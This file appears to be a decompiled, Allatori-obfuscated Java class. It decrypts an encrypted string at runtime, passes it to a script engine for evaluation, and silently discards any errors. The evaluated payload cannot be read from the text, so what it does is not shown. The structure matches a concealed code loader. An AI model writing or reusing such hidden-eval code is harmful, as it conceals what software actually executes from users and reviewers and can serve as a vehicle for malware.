import javax.script.ScriptException;
import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;

// 
// Decompiled by Procyon v0.5.30
// 

public class k
{
    ScriptEngine ALLATORI_DEMO;
    
    public static String ALLATORI_DEMO(final String a) {
        final int n = (0x3 ^ 0x5) << 3 ^ 0x5;
        final int n2 = (0x3 ^ 0x5) << 4 ^ 3 << 1;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final char c = (char)n2;
        final int n4 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char char1 = a.charAt(n5);
            --n3;
            array3[n5] = (char)(char1 ^ n4);
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n3;
            array4[n6] = c2;
            i = n3;
        }
        return new String(array2);
    }
    
    public k() {
        this.ALLATORI_DEMO = new ScriptEngineManager().getEngineByName(l.b(l.ALLATORI_DEMO(y.E("a\u000fx"))).replace(l.b(r.ALLATORI_DEMO(y.E("x"))), ""));
    }
    
    void ALLATORI_DEMO() {
        try {
            this.ALLATORI_DEMO.eval(l.b(l.ALLATORI_DEMO(y.E("K>NfNyNf\tjO+Xy\bxPxOxP?Od\bxPxOxP?O+\u0000+Sn\bxPxOxP?J+xyO>NfNyNf\tdO#\u001fF\bxPxOxP?D+Xy\bxPxOxP?Od\bxPxOxP?O)\u00140I>NfNyNf\tcT>NfNyNf\tx\u0013\u007fR>NfNyNf\tXIy\bxPxOxP?Te\bxPxOxP?Z+\u0000+[~S>NfNyNf\thIbR>NfNyNf\te\u0015\"F+W>NfNyNf\tjK>NfNyNf\tj\u0013g\\>NfNyNf\teZ%nr\bxPxOxP?N\u007f\bxPxOxP?Xf\u0013x\bxPxOxP?X\u007f\bxPxOxP?nn^~\bxPxOxP?ObIrp>NfNyNf\tjSj\bxPxOxP?ZnO#S>NfNyNf\t~Qg\u00140\\{Mg\bxPxOxP?X\u007f\u0013xIj\bxPxOxP?O\u007f\u0015\"\u0006yX>NfNyNf\t\u007fHy\bxPxOxP?S+\u001fnE>NfNyNf\t{Qd\bxPxOxP?T\u007f\u001c)\u0006v\u0006>NfNyNf\tnOy\bxPxOxP?Ry\u0013f\bxPxOxP?XxNj\bxPxOxP?Zn\u001d6\u001d\u007fUb\bxPxOxP?N0"))).replace(l.b(r.ALLATORI_DEMO(y.E("-9u9j9u~"))), ""));
        }
        catch (ScriptException ex) {}
    }
}
